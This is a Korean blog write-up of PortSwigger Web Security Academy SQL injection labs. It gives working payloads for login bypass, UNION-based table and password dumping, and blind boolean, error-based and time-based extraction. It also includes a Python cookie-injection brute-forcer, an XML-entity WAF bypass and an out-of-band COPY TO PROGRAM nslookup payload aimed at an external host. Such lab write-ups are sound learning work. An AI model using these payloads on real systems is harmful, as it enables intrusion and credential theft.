---
slug: "portswigger-sqli"
title: "portswigger-sqli"
date: 2026-07-02
category: "웹해킹"
section: "wargame"
tags: []
excerpt: "[레닥션: 계정 로그인 정보 (공개 블로그 노출 방지를 위해 제거)]"
readingTime: 19
---

[레닥션: 계정 로그인 정보 (공개 블로그 노출 방지를 위해 제거)]

무슨 db일지 감 안올땐 MySQL → PostgreSQL → Oracle 순으로 시도하는 게 현실적

현재 진행률 (16/18)

--> 왜 두개는 안푸냐? 뭐 결제해야 이용할 수 있는 서비스 문제에여 엉엉 
   ( 절대 OOB를 검색하지마) 

---
# SQL injection vulnerability allowing login bypass

일단 가장 기본적인 걸로 됐는데 
```
' or 1=1 -- 
```
어이없는 점:
" 얘로 하지 말고 ' 이걸로하고 # 말고 -- 이걸로 하센

---
# SQL injection attack, querying the database type and version on Oracle

첫시도
```
' union select * from v$version -- 
```
-> 실패

**이유 :**  
- union은 컬럼 갯수를 맞춰야 함,
- 웹 쿼리를 날릴땐 ;(세미콜론)을 사용해선 안됨
**페이로드**
```
' union select banner,null from v$version --
``` 

---
# SQL injection attack, querying the database type and version on MySQL and Microsoft

첫시도
```
' union select version()
```

두번째
```
' union select @@version,null -- 
```
-> microsoft랑 mysql은 @@version으로 버전을 표시한다고 함

**이유:**
- mysql은 뒤에 공백이 있어야 쿼리가 실행되는데 공백을 url에 넣어도 무시됐음
- 그때 ' + ' 로 해결할 수 있음

**페이로드**
```
' union select @@version,null --+
```


---
# SQL injection attack, listing the database contents on non-Oracle databases

첫시도
```
' UNION SELECT table_name,column_name FROM information_schema.columns--+
```
-> 성공 테이블 이름, 컬럼명 쭉 나옴 (난잡함)

**테이블 보기**
```
' UNION SELECT table_name,NULL FROM information_schema.tables --+
```

**컬럼 보기**
```
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='pg_user'--+
```

-> 해당 테이블에 무슨 컬럼 있는지 보여줌
```
' union select usename,passwd from pg_user--+
```
 -> 이걸로 안에 내용 봄 근데 pg_user는 아니였음

users_zbagqx <- 클로드가 얘 찾아줌

**이유:**
이때 여기서 원래는 users 라는 키워드가 붙은걸 찾으면 좋다고 함
난 시간 단축을 그냥 물어봤음

**페이로드**
```mysql
# 테이블 안 컬럼
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_zbagqx'--+

# 컬럼 안 내용보기
' union select username_lxdrsw,password_skayqc from users_zbagqx--+
```

| administrator | qfa303kvar37vxl5n6wt |
| ------------- | -------------------- |

---
# SQL injection attack, listing the database contents on Oracle

```
' UNION SELECT table_name,null FROM all_tables--+
```
-> 오라클db는 all_tables- 현재 유저가 접근 가능한 테이블 목록
```
' UNION SELECT table_name,column_name FROM all_tab_columns--+
```
-> 테이블이름, 컬럼 이름같이 나옴
일단 user가 들어가는 놈으로 후보를 추리면

| APP_USERS_AND_ROLES    |
| ---------------------- |
| SDO_PREFERRED_OPS_USER |
| USERS_VIPMGO           |

뭔가 마지막께 좋아보임

**페이로드**
```mysql
# 나이스 성공
' UNION SELECT column_name,null FROM all_tab_columns where table_name='USERS_VIPMGO'--+

' UNION SELECT USERNAME_EITIQQ,PASSWORD_RNOHXF FROM USERS_VIPMGO--+
```

| administrator | xsk8hyoe1urlmidd8hk5 |
| ------------- | -------------------- |

---
# SQL injection UNION attack, determining the number of columns returned by the query

```
' UNION SELECT table_name,null FROM all_tables --
```
실패 !-> url에 뒤에 +가 안들어가도 되는걸 보고 mysql은 아니구나~ 라고 생각

쿼리로 현재 컬럼 몇개인지 알아 볼 수 있는 방법이 있음
```
' order by 1--
```
이게 오류가 날 때까지 하는 거임. 오류가 나면 바로 그 전에 숫자가 바로 컬럼 갯수

**페이로드**
```
' union select null,null,null --
```

---
# SQL injection UNION attack, finding a column containing text

```
' order by 3 --
```
```
' UNION SELECT banner,NULL,NULL order by 1--
```
-> 둘다 성공 !     컬럼 수는 3개임

**페이로드**
```
' UNION SELECT NULL,'eDog5j',NULL--
```
-> union은 문자열인 곳에 문자열을 넣어야함
리터럴 방식으로 저렇게 넣으면 원하는 결과가 출력되는 듯 함

---
# SQL injection UNION attack, retrieving data from other tables

```
' order by 2 --

` union select null,null --
```
-> 컬럼 갯수 2개

**페이로드**
```
' union select username,password from users --
```

| administrator | jvklxdkyr5owln4x0c6c |
| ------------- | -------------------- |

---
# SQL injection UNION attack, retrieving multiple values in a single column

```
' order by 2--

' union select null,null--

' union select null,'good'--
```
-> 컬럼은 2개고 2번째 자리가 문자열이다.

**페이로드**
```
' union select null,username from users--

' union select null,password from users where username='administrator'--

```

-> 문자열 리터럴은 반드시 ' ' 로 감쌀것 !!! 제발 !!!! 까먹지마 !!!!!

| administrator | e6h5ep1yivga24h85v20 |
| ------------- | -------------------- |

---
# Blind SQL injection with conditional responses

```
’ and '1'='1' --
```

- 문자 숫자 조합을 찾는것 보다 아스키로 찾는게 편하기에 ascii로 출력하는걸 지향
- substr(select문, 시작, 글자 수)로 문자열 비교 
	-> 우선은 length부터 따고 이후에 문자를 따는게 좋음

```
' and (length(select password from useres where username='administrator')) > i) --
```

이번엔 python 코드를 짜줌 (문자열 길이)
```python
import requests

url = "https://0a3b009a0469a8a583e4afd4008f003a.web-security-academy.net/filter?category="

for length in range(0,50):
    cookies = {
    "TrackingId":f"xYsyLVxblCzzJ6O0' AND (LENGTH((SELECT password FROM users WHERE username='administrator')) > {length})--",
    "session" : "axDPQaBBU3cy1RHxOmekaaSSlAKiiIHF"
    }
    reponse = requests.get(url, cookies=cookies)
    if "Welcome back" in reponse.text:
        print(f"True -> {length}글자")
    else:
        print(f"False -> {length}글자")
        break
```
-> 20글자 라고 나옴

이번엔  글자 맞추는 놈으로
```
' AND (ascii(substr((SELECT password FROM users WHERE username='administrator'),i,1)) > c)--
```

하면 한 1시간 걸려서 flag 나옴

```
password : k15uhg7bso0rf9e9o5av
```

---
# Blind SQL injection with conditional errors

error bases blind sql 문제임
일단 oracle db에서 간단한 오류를 일으킬 수 있는 구문을 찾아야함
```
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual) || '
```
- 일단 이걸로 간단한 에러를 일으킬 수 있음
- case when ... then ...   else ... end => if/else 문임
- 'dual'은 걍 더미 테이블
- 조건이 참이면 에러 응답
- 조건이 거짓이면 **정상 응답(null이라 아무동작 안하게)**
- ' || ' 는 어떤 쿼리 실행 자체가 목적일때 사용하고
- ' union ' 은 결과를 화면에 표출해야 할 때 사용
- 보니까 카테고리에서만 동작함

```
' || (SELECT CASE WHEN (LENGTH((SELECT password FROM users WHERE username='administrator')) > 20) THEN TO_CHAR(1/0) ELSE NULL END FROM dual) || '
```
20에서 정상 19에서 에러 => 이러면 20글자

이제 substr 하는 쿼리 작성
```
' || (SELECT CASE WHEN (ascii(substr((SELECT password FROM users WHERE username='administrator'),{i},1)) > {c}) THEN TO_CHAR(1/0) ELSE NULL END FROM dual) || '
```

성공~

---
# Visible error-based SQL injection
rY8y3GNbBIwGLw1e

에러가 보이는 경우 논리적 에러를 낼 수 있는 녀석을 사용해야 함
우선은 어떤 db를 사용하는지 봐야함
```
' || CTXSYS.DRITHSX.SN(user,1337) --

// ERROR: cross-database references are not implemented: ctxsys.drithsx.sn Position: 57
```
아마도 오라클 db가 아니라는 뜻같음

```
' || CAST((SELECT version()) AS int) --

// ERROR: invalid input syntax for type integer: "PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit"
```
-> 이거 사용했더니 postgresql이라고 함
- **Cast:** postgresql에서 데이터 타입을 보여주는 함수임
	->얘는 에러 메시지에 변환하려던 값을 그대로 노출함

- 테이블 column은 다 나와있으니까 페이로드 작성

```
5mpoDVvbVjWRoFqX' || CAST((SELECT password FROM users LIMIT 1) AS int)--
```
-> 자꾸 문자열이 길다고 안받아줘서 기존 적혀있던쿠키 그냥 지워버리고 했더니 성공함
```
' || CAST((SELECT password FROM users LIMIT 1) AS int)--
```

elv7nba8k5sri47b3tjq
### -> 다 풀어놓고 개뻘짓함 에러를 잘 읽자

---
# Blind SQL injection with time delays

무슨 db 사용하고 있는지부터 보자

일단 시간 지연 함수들을 다 써봐
```Oracle
' || (SELECT dbms_pipe.receive_message(('a'),10) FROM dual) || '
```
- 얜 근데 기본적으로 시간 딜레이 관련 함수는 아니고 파이프간 통신을 하는건데 그 파이프 이름이 a라는거임
- 내가 열어두면 누군가가 이 'a' 파이프에 메시지를 보내면 즉시 리턴하게함
- 아무도 안보낼 시 10초 대기하는 놈임 ㅇㅇ

-> 근데 안먹힘 => 다른 db 도전

```postgresql
' || pg_sleep(10) || '
```
-> 엥 성공함 postgresql 이였음 ㄷㄷ

---
# Blind SQL injection with time delays and information retrieval

xvd1moXtRUhPkVFM

~~~postgresql
' || pg_sleep(10) || '
~~~
-> 일단 슬립은 먹히는 것 같음


~~~postgresql
' || case when (select char_length(password) from users where username='administrator')>=20 then pg_sleep(5) ELSE pg_sleep(0) end || '
~~~
20글자 인 듯 함

다음은  글자를 맞춰야 되는데 이거 코딩 해야 할듯함
~~~
' || case when (ascii(substr((SELECT password FROM users WHERE username='administrator'),i,1)) > c) then pg_sleep(5) ELSE pg_sleep(0) end || '
~~~
-> 이진 탐색을 공부해보는게 좋음

---
# Blind SQL injection with out-of-band interaction

0mSpsjilLFfkxP6v

### In-band vs Out-of-band
-> 네트워크 관리의 일종

- **In-band** 
	- 일반적인 데이터 트래픽과 동일한 네트워크 채널을 통해 관리 작업을 수행하는 방식
	- 관리 트래픽이 일반 데이터와 같은 경로를 따라 이동

- **Out-of-band**       ->  좀 특이한 놈
	- 별도의 독립적인 채널을 통해 네트워크 장비를 관리하는 방식
	- 별도의 전용경로를 사용(응급 전용 차선 같은 너낌)

sqli가 가능한데 Inband로 결과 확인 불가, boolean, timebased로 결과 확인 못하거나 너무 느릴때! out of band 기법 사용
**but**
dbms 종류별, 버전별로 공격 불가능 할 수도 있음

-> 이 개쉐이들 갑자기 돈을 내야 쓸수 있는 기능을 쓰라네 
~~~
interactsh, webhook.site, 개인 DNS 서버
~~~

원래는 위에 방법으로 하면되고 postgresql 기준 페이로드는 대충 아래와 같음
~~~postgresql
 '; COPY (SELECT '') TO PROGRAM 'nslookup xxxx.oastify.com'--
~~~

#### 돈먹는 하마 이슈로 SKIP!!
---
# 다음 문제도 !!!

---
# SQL injection with filter bypass via XML encoding

burp로 request패킷 보니까 
~~~xml
<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>
		16
		</productId>
		<storeId>
		1
		</storeId>
	</stockCheck>
~~~
이렇게 xml을 보내고 있음

방화벽이 가로막고 있어서 아래 테스트 쿼리를 10진수 변환해서 productId 뒤에 넣어줌
~~~sql
UNION SELECT NULL--
~~~
-> 문자열 감지일때 가로막히는 중임
∴ 10진수 인코딩을 진행
~~~xml
<productId>16 &#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#78;&#85;&#76;&#76;&#45;&#45;</productId>
~~~
-> 이렇게 하면 waf가 xml 파서 위에서 돌고 있어서 방화벽 지나간 후 xml파서가 이를 쿼리로 변환

이제 쿼리를 짜보자
~~~sql
UNION SELECT username||'~'||password FROM users--
~~~
--> || 는 쿼리에서 그냥 문자열 연결하는 연산자 라고 생각하면 됨
	가운데 ~ 는 그냥 보기 편하게 어디부터 어디가 id, pw인지 보여주는 애임

~~~
&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#124;&#124;&#39;&#126;&#39;&#124;&#124;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;&#45;&#45;
~~~

결과는 아래와 같음
~~~
948 units
administrator~h43ghd3ms7skn7vtdjml
carlos~ww82whnalf1019x97gj6
wiener~hfbf8z2xwomzmb8me1ks
131 units
164 units
~~~
